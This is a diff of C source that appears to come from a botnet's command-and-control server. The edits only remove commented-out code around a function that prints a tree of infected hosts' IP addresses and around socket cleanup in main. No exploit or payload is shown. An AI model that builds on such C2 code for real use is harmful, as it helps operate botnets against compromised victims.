@@ -99,12 +99,7 @@ numbers in the row represent the numbers of the struct which he infected
 */
 void print_tree (int parent_list [100][100], int base_device, int tab_dis ,struct jojo_botnet_node my_cANDc[100])
 {
-    ////tabs
-    // char* tabs ;
-    // for (int tab = 0; tab < tab_dis; tab++ )
-    // {
-    //     strcat (tabs, "\t");
-    // }
+    
     // iterate through column (the ones he infected)
     for (int column = 0; (parent_list[base_device][column] > -1 )&&(column<100); column ++)
     {
@@ -116,8 +111,6 @@ void print_tree (int parent_list [100][100], int base_device, int tab_dis ,struc
         echo_tabs(tab_dis);
         printf("=> %s\n", my_cANDc[parent_list[base_device][column]].host_ip);
 
-
-        // printf("\n%s |\n%s=>host ip: %s ", tabs, tabs, my_cANDc[parent_list[base_device][column]].host_ip);
         print_tree (parent_list, parent_list[base_device][column], tab_dis + 1, my_cANDc );
     }
     return;
@@ -427,8 +420,6 @@ int __cdecl main(void)
             return 1;
         }
 
-        // // to gnore if the user in the queue enterd input
-        // iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
 
         
  
@@ -445,7 +436,7 @@ int __cdecl main(void)
         return 1;
     }
 
-    // cleanup
+    // cleanup:
 
     // No longer need server socket
     closesocket(ListenSocket);
